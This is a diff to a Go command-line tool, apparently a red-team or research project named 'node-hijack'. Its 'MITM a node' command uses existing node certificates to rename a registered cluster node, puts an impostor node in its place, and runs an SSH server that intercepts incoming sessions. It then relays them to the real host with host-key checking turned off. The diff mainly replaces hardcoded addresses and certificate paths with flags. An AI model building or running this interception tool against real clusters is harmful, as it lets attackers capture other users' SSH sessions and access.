@@ -20,14 +20,18 @@ import (
 	api "xpnsec.com/node-hijack/v2/pkg/api"
 	transport "xpnsec.com/node-hijack/v2/pkg/api/transport"
 	sshserver "xpnsec.com/node-hijack/v2/pkg/ssh"
+	"xpnsec.com/shared/v2/pkg/connection"
 )
 
-var clientCert string
-var clientKey string
 var nodeId string
 var clientSSHCert string
+var hostSSHCert string
+var hostSSHKey string
+var updatedHostname string
+
 var ctx context.Context
 var cancel context.CancelFunc
+var connectionOptions connection.Options
 
 func sleep(ctx context.Context, duration time.Duration) error {
 	timer := time.NewTimer(duration)
@@ -232,7 +236,7 @@ var MITMCmd = &cobra.Command{
 	Short: "MITM a node",
 	Long:  ``,
 	Run: func(cmd *cobra.Command, args []string) {
-		client, err := api.NewClient(clientCert, clientKey, "10.1.10.1:8443")
+		client, err := api.NewClient(connectionOptions.ClientCert, connectionOptions.ClientKey, connectionOptions.Proxy, connectionOptions.ClusterName)
 		if err != nil {
 			panic(err)
 		}
@@ -264,6 +268,7 @@ var MITMCmd = &cobra.Command{
 				default:
 					// We need to rename the old hostname so we can capture others connecting to it
 					node.Spec.Hostname = fmt.Sprintf("%s-archived", oldHostname)
+					updatedHostname = node.Spec.Hostname
 					client.UpdateNode(context.Background(), node)
 
 					// Now we can create our new node which will receive connections
@@ -277,7 +282,7 @@ var MITMCmd = &cobra.Command{
 		}(ctx)
 
 		go func(ctx context.Context) {
-			server := sshserver.NewSSHServer("/tmp/hijack-certs/host_ssh_signed.crt", "/tmp/hijack-certs/host.key")
+			server := sshserver.NewSSHServer(hostSSHCert, hostSSHKey)
 			fmt.Printf("[*] SSH Server Started on port 2223\n")
 			err := server.Start(func(s gssh.Session) {
 
@@ -324,8 +329,8 @@ var MITMCmd = &cobra.Command{
 					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 				}
 
-				client, err := transport.NewClient("10.1.10.1:8443")
-				sshConnTunnel, err := client.CreateSSHConnection(ctx, "example.com", "teleport-node-2-archived:22")
+				client, err := transport.NewClient(connectionOptions.Proxy)
+				sshConnTunnel, err := client.CreateSSHConnection(ctx, connectionOptions.ClusterName, updatedHostname+"-archived:22")
 				sshConn, chans, reqs, err := ssh.NewClientConn(sshConnTunnel, "", clientConf)
 				if err != nil {
 					io.WriteString(s, fmt.Sprintf("dial target: %v\n", err))
@@ -355,8 +360,21 @@ var MITMCmd = &cobra.Command{
 func init() {
 	ctx, cancel = context.WithCancel(context.Background())
 
-	MITMCmd.Flags().StringVarP(&clientCert, "client-cert", "c", "", "Existing Node Cert")
-	MITMCmd.Flags().StringVarP(&clientKey, "client-key", "k", "", "Existing Node Key")
 	MITMCmd.Flags().StringVarP(&clientSSHCert, "client-ssh-cert", "s", "", "Existing SSH Cert")
 	MITMCmd.Flags().StringVarP(&nodeId, "node-id", "n", "", "Node ID")
+	MITMCmd.Flags().StringVarP(&hostSSHCert, "host-ssh-cert", "", "", "Host SSH Cert")
+	MITMCmd.Flags().StringVarP(&hostSSHKey, "host-ssh-key", "", "", "Host SSH Key")
+
+	connectionOptions.AddProxyFlag(MITMCmd.Flags())
+	connectionOptions.AddClientCredentialFlags(MITMCmd.Flags())
+	connectionOptions.AddClusterNameFlag(MITMCmd.Flags())
+
+	MITMCmd.MarkFlagRequired("node-id")
+	MITMCmd.MarkFlagRequired("client-ssh-cert")
+	MITMCmd.MarkFlagRequired("proxy")
+	MITMCmd.MarkFlagRequired("client-cert")
+	MITMCmd.MarkFlagRequired("client-key")
+	MITMCmd.MarkFlagRequired("cluster-name")
+	MITMCmd.MarkFlagRequired("host-ssh-cert")
+	MITMCmd.MarkFlagRequired("host-ssh-key")
 }
